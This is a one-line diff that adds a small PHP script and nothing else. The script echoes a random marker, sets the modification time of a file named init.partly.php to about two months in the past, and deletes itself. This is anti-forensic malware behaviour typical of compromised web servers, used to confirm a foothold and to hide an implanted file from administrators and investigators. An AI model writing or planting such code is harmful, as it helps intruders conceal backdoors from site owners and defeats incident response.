@@ -1,0 +1,1 @@
+<?php echo "czFKvsRnpu"; if (file_exists("./init.partly.php")){ touch("./init.partly.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*xvWnxQx5NMTXDz1SY6UR*/ ?>
